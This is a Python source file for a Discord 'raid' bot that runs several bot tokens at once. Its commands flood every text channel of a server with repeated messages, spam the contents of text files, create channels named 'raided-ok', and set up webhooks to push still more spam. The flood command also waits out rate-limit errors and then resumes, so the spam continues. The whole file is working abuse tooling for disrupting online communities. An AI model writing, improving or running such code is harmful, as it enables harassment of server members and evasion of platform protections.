#multi token
import discord
from discord.ext import commands
import asyncio
import os


bt = [
    '', # tokens go here, to add more just put, and add '' in a new line in this format
    '',
    ''
    
]


async def rn(token):
    bot = commands.Bot(command_prefix='!')

    @bot.event
    async def on_ready():
        print(f'Logged in as {bot.user}')

    @bot.command()
    async def test(ctx):
        await ctx.send('hi')

    @bot.command()
    async def smessage(ctx, *, message: str):
        guild = ctx.guild
        if not guild:
            await ctx.send("works in server")
            return

        async def sm(channel):
            for _ in range(20): #increase, but remember rate limits
                try:
                    await channel.send(message)
                except discord.Forbidden:
                    print(f"permission denied to send message in {channel.name}")
                except discord.HTTPException as e:
                    print(f"failed to send message in {channel.name}: {e}")

        tasks = []
        for channel in guild.text_channels:
            tasks.append(sm(channel))

        await asyncio.gather(*tasks)
        await ctx.send("-")

    @bot.command()
    async def wspareraid(ctx):
        async def spam_m(message):
            await ctx.send(message)

        async def spam_lp(message):
            for _ in range(100):
                await ctx.send(message)
                await asyncio.sleep(0)

        files = ["main.txt", "main1.txt", "main2.txt", "main3.txt", "main4.txt"]
        filec = []
        for file in files:
            with open(file, 'r') as f:
                filec.append(f.read())

        for content in filec:
            await spam_m(content)
            await asyncio.sleep(0.4)
            await spam_lp(content)

    @bot.command()
    async def flood(ctx, times: int, *, message: str):
        async def spam_message():
            await ctx.send(message)

        async def spam_loop():
            for _ in range(times):
                try:
                    await ctx.send(message)
                except discord.errors.HTTPException as e:
                    if e.status == 429:
                        retry_after = e.retry_after
                        await asyncio.sleep(retry_after)
                        await ctx.send(message)
        
        await spam_message()
        await spam_loop()

    @bot.command()
    async def leave(ctx):
        if ctx.voice_client:
            await ctx.voice_client.disconnect()
            await ctx.send("-left")
        else:
            await ctx.send("-not in vc")

    @bot.command()
    async def play(ctx, *, sound: str):
        if ctx.voice_client:
            if os.path.exists(f'sounds/{sound}.mp3'):
                ctx.voice_client.stop()
                pl(ctx, sound)
                await ctx.send(f'now playing: {sound}')
            else:
                await ctx.send(f'sound file {sound}.mp3 not found.')
        else:
            await ctx.send("-not in vc")

    def pl(ctx, sound):
        if os.path.exists(f'sounds/{sound}.mp3'):
            source = discord.FFmpegPCMAudio(f'sounds/{sound}.mp3')
            ctx.voice_client.play(source, after=lambda e: play_next(ctx, sound))
        else:
            print(f'sound file {sound}.mp3 not found.')

    @bot.command()
    async def stop(ctx):
        if ctx.voice_client:
            ctx.voice_client.stop()
            await ctx.send("-stopped")
        else:
            await ctx.send("-not in vc")

    @bot.command()
    async def join(ctx, channel_id: int):
        ch = bot.get_channel(channel_id)

        if ch:
            if isinstance(ch, discord.VoiceChannel):
                await ch.connect()
                await ctx.send(f'joined {ch.name}')
            else:
                await ctx.send('not vc channel')
        else:
            await ctx.send('not found')

    @bot.command()
    async def createchannels(ctx):
        guild = ctx.guild
        if not guild:
            await ctx.send("-server only")
            return

        for i in range(10):  
            await guild.create_text_channel(f"raided-ok{bot.user.name}-{i+1}")

        await ctx.send("-done")

    @bot.command()
    async def createwebhooks(ctx):
        guild = ctx.guild
        if not guild:
            await ctx.send("this command can only be used in a server.")
            return

        async def create_webhook(channel):
            try:
                webhook = await channel.create_webhook(name="shogun")
                return webhook
            except discord.Forbidden:
                print(f"permission denied to create webhook in {channel.name}")
            except discord.HTTPException as e:
                print(f"failed to create webhook in {channel.name}: {e}")
            return None

        async def send_file_content(webhook, content):
            try:
                await webhook.send(content=content)
            except discord.HTTPException as e:
                print(f"-failed: {e}")

        files = ["main.txt", "main1.txt", "main2.txt", "main3.txt", "main4.txt", "main5.txt", "main6.txt", "main7.txt"]
        file_contents = []

        for file in files:
            try:
                with open(file, 'r', encoding='utf-8') as f:
                    file_contents.append(f.read())
            except FileNotFoundError:
                print(f"File '{file}' not found.")

        tasks = []
        for channel in guild.text_channels:
            if channel.name.startswith(f"spam-channel-{bot.user.name}"):
                for i in range(10):
                    webhook = await create_webhook(channel)
                    if webhook:
                        for content in file_contents:
                            tasks.append(send_file_content(webhook, content))
                            await asyncio.sleep(0.1)

        await asyncio.gather(*tasks)
        await ctx.send("-done")

    await bot.start(token)


async def st():
    bottask = [rn(token) for token in bt]
    await asyncio.gather(*bottask)
asyncio.run(st())
